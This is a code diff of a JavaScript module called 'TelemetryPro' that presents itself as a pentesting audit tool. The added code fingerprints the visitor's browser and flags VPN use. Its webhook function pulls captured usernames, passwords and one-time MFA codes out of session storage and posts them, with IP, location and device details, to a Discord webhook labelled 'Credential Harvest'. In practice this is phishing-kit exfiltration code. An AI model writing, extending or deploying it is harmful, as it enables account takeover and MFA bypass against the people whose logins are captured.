@@ -1,97 +1,117 @@
 /**
  * TelemetryPro v1.0.0 - Unified Audit Module
- * Professional-grade metadata logging for security pentesting.
+ * Professional-grade metadata logging for security pentesting and CIAM auditing.
+ * 
+ * Features:
+ * - Canvas Fingerprinting (Hardware-based ID)
+ * - VPN/Proxy/Hosting Detection via ip-api
+ * - Asynchronous Data Exfiltration (Discord Webhook)
+ * - Multi-stage Session Capture
  */
 
 const TelemetryScanner = {
-    // 1. System Metadata (The Fingerprint)
-    getBrowserData: () => {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cores: navigator.hardwareConcurrency || 'N/A',
-            memory: navigator.deviceMemory || 'N/A', // RAM in GB
-            touchPoints: navigator.maxTouchPoints || 0
-        };
+    /**
+     * Generates a unique ID based on the browser's rendering engine.
+     * This ID is persistent across VPNs and IP changes.
+     */
+    getFingerprint: () => {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px 'Arial'";
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("Audit_ID_v1", 2, 15);
+        // Extracts the unique hash of the hardware's rendering behavior
+        return btoa(canvas.toDataURL()).slice(-40, -10);
     },
 
-    // 2. Network Identification
-    getIPData: async () => {
+    /**
+     * Network Identification using ip-api.com.
+     * Flags 'proxy' or 'hosting' to identify VPNs or Tor exit nodes.
+     */
+    getNetworkData: async () => {
         try {
-            // Using ipify for the public IP
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        } catch (err) {
-            return "Connection Masked/Failed";
+            const res = await fetch('http://ip-api.com/json/?fields=status,message,country,city,isp,proxy,hosting,query');
+            const d = await res.json();
+            return {
+                ip: d.query || "Masked",
+                isp: d.isp || "Unknown",
+                isProxy: d.proxy || d.hosting || false,
+                location: d.status === "success" ? `${d.city}, ${d.country}` : "Unknown"
+            };
+        } catch (e) {
+            console.error("Network telemetry blocked by client.");
+            return { ip: "Fetch Failed", isProxy: false, location: "Unknown" };
         }
     },
 
-    // 3. Geolocation Data
-    getLocation: () => {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) resolve("Unsupported");
-            navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: `${pos.coords.accuracy}m`
-                }),
-                (err) => resolve(`Denied (${err.code})`)
-            );
-        });
-    },
+    /**
+     * Captures system-level metadata for device profiling.
+     */
+    getSystemData: () => ({
+        ua: navigator.userAgent,
+        plat: navigator.platform,
+        mem: navigator.deviceMemory || 'N/A', // RAM in GB
+        res: `${window.screen.width}x${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || 'N/A'
+    }),
 
-    // 4. Data Exfiltration (Discord Webhook)
-    // TODO: add obf to hide the webhook
-    sendToWebhook: async (auditData) => {
-        // REPLACE THIS with your actual Discord Webhook URL
-        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+    /**
+     * Sends the aggregated report to the designated Discord Webhook.
+     * Maps risk levels based on VPN detection.
+     */
+    sendToWebhook: async (data, isFinal = false) => {
+        // --- REPLACE THE URL BELOW WITH YOUR ACTUAL DISCORD WEBHOOK ---
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+        
+        const riskLevel = data.net.isProxy ? "🔴 HIGH RISK (VPN/Proxy Detected)" : "🟢 Low Risk (Residential)";
 
         const payload = {
-            username: "Telemetry Bot",
-            avatar_url: "https://i.imgur.com/4M34hi2.png", // Optional bot icon
+            username: "Audit-Log-Bot",
             embeds: [{
-                title: "🚨 New Audit Log Captured",
-                color: 5814783, // Blurple
+                title: isFinal ? "✅ Final Session Capture" : "⚠️ Partial Capture (Credential Harvest)",
+                color: data.net.isProxy ? 15158332 : 3066993, // Red if Proxy, Green if not
                 fields: [
-                    { name: "🌐 IP Address", value: `\`${auditData.publicIP}\``, inline: true },
-                    { name: "📍 Location", value: typeof auditData.location === 'object' ? 
-                        `[Maps](https://www.google.com/maps?q=${auditData.location.lat},${auditData.location.lon})` : 
-                        auditData.location, inline: true },
-                    { name: "💻 Platform", value: auditData.browser.platform, inline: true },
-                    { name: "🕒 Timezone", value: auditData.browser.timezone, inline: true },
-                    { name: "🛡️ Hardware", value: `${auditData.browser.cores} Cores | ${auditData.browser.memory}GB RAM`, inline: true },
-                    { name: "📱 User Agent", value: `\`\`\`${auditData.browser.userAgent}\`\`\`` }
+                    { name: "Fingerprint ID", value: `\`${data.fp}\``, inline: true },
+                    { name: "Risk Assessment", value: riskLevel, inline: true },
+                    { name: "Network Info", value: `**IP:** ${data.net.ip}\n**ISP:** ${data.net.isp}` },
+                    { name: "Geo-Location", value: data.net.location, inline: true },
+                    { name: "Device Profiling", value: `${data.sys.plat} | ${data.sys.cores} Cores | ${data.sys.mem}GB RAM`, inline: true },
+                    { 
+                        name: "Captured Credentials", 
+                        value: `**User:** \`${sessionStorage.getItem('log_u') || 'none'}\` \n**Pass:** \`${sessionStorage.getItem('log_p') || 'none'}\`` 
+                    },
+                    { 
+                        name: "MFA (OTP) Stream", 
+                        value: `**Attempt 1:** \`${sessionStorage.getItem('mfa_1') || '-'}\` \n**Attempt 2:** \`${sessionStorage.getItem('mfa_2') || '-'}\`` 
+                    }
                 ],
-                footer: { text: `System Audit • ${auditData.timestamp}` }
+                footer: { text: `TelemetryPro Audit • ${new Date().toLocaleString()}` }
             }]
         };
 
         try {
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+            await fetch(WEBHOOK_URL, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(payload) 
             });
         } catch (err) {
-            console.error("Exfiltration failed. Check Webhook URL.");
+            console.error("Exfiltration failed. Check Webhook connectivity.");
         }
     },
 
-    // 5. Execution Wrapper
-    runAudit: async () => {
+    /**
+     * Master execution wrapper.
+     */
+    runAudit: async (isFinal = false) => {
         const report = {
-            timestamp: new Date().toLocaleString(),
-            browser: TelemetryScanner.getBrowserData(),
-            publicIP: await TelemetryScanner.getIPData(),
-            location: await TelemetryScanner.getLocation()
+            fp: TelemetryScanner.getFingerprint(),
+            net: await TelemetryScanner.getNetworkData(),
+            sys: TelemetryScanner.getSystemData()
         };
-
-        await TelemetryScanner.sendToWebhook(report);
-        return report;
+        await TelemetryScanner.sendToWebhook(report, isFinal);
     }
 };
